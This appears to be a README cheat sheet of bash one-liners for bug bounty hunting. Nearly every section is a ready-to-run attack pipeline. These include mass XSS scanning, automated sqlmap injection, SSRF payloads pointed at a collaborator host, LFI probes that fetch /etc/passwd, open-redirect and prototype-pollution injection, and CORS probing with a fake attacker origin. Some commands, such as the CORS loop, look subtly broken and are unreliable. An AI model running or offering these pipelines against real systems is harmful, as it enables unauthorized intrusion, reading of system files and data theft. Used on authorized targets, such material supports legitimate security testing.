# *BUG BOUNTY WITH ONE-LINE BASH SCRIPTS 🕵️*

## *𝐗𝐒𝐒 ⪼*
```
cat targets.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
cat targets.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```

## *𝐒𝐐𝐋𝐢 ⪼*
```
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```

## *𝐒𝐒𝐑𝐅 ⪼*
```
findomain -t http://target.com -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace 𝘩𝘵𝘵𝘱://𝘠𝘖𝘜𝘙.𝘣𝘶𝘳𝘱𝘤𝘰𝘭𝘭𝘢𝘣𝘰𝘳𝘢𝘵𝘰𝘳.𝘯𝘦𝘵
```

## *𝐋𝐅𝐈 ⪼*
```
gau http://vuln.target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

## *𝐎𝐏𝐄𝐍 𝐑𝐄𝐃𝐈𝐑𝐄𝐂𝐓 ⪼*
```
gau http://vuln.target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

## *𝐏𝐑𝐎𝐓𝐎𝐓𝐘𝐏𝐄 𝐏𝐎𝐋𝐋𝐔𝐓𝐈𝐎𝐍 ⪼*
```
subfinder -d http://target.com | httpx -silent | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[NOT]"' | sed "s/(//g"|sed"s/)//g" | sed "s/JS//g" | grep "VULN"
```

## *𝐂𝐎𝐑𝐒 ⪼*
```
gau http://vuln.target.com | while read url;do target=$(curl -s -I -H "Origin: https://evvil.com" -X GET $url) | if grep 'https://evvil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

## *𝐄𝐱𝐭𝐫𝐚𝐜𝐭 .𝐣𝐬 ⪼*
```
echo http://target.com | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
assetfinder http://vuln.target.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew
```

## *𝐄𝐱𝐭𝐫𝐚𝐜𝐭 𝐔𝐑𝐋𝐬 𝐟𝐫𝐨𝐦 𝐜𝐨𝐦𝐦𝐞𝐧𝐭 ⪼*
```
cat targets.txt | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]'
```

## *𝐃𝐮𝐦𝐩 𝐈𝐧-𝐬𝐜𝐨𝐩𝐞 𝐀𝐬𝐬𝐞𝐭𝐬 𝐟𝐫𝐨𝐦 𝐇𝐚𝐜𝐤𝐞𝐫𝐎𝐧𝐞 ⪼*
```
curl -sL 𝘩𝘵𝘵𝘱𝘴://𝘨𝘪𝘵𝘩𝘶𝘣.𝘤𝘰𝘮/𝘢𝘳𝘬𝘢𝘥𝘪𝘺𝘵/𝘣𝘰𝘶𝘯𝘵𝘺-𝘵𝘢𝘳𝘨𝘦𝘵𝘴-𝘥𝘢𝘵𝘢/𝘣𝘭𝘰𝘣/𝘮𝘢𝘴𝘵𝘦𝘳/𝘥𝘢𝘵𝘢/𝘩𝘢𝘤𝘬𝘦𝘳𝘰𝘯𝘦_𝘥𝘢𝘵𝘢.𝘫𝘴𝘰𝘯?𝘳𝘢𝘸=𝘵𝘳𝘶𝘦 | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type]
```

## *𝐅𝐢𝐧𝐝 𝐥𝐢𝐯𝐞 𝐡𝐨𝐬𝐭/𝐝𝐨𝐦𝐚𝐢𝐧/𝐚𝐬𝐬𝐞𝐭𝐬 ⪼*
```
subfinder -d http://vuln.target.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

## *𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭 ⪼*
```
assetfinder -subs-only http://target.com | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @'
```

----
# ***SUPPORT***
You can Follow [me](https://www.linkedin.com/in/bhavesh-pardhi-/) on LinkedIn or
<br><br>[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support-orange?style=for-the-badge&logo=buy-me-a-coffee)](https://www.buymeacoffee.com/bhaveshpardhi)
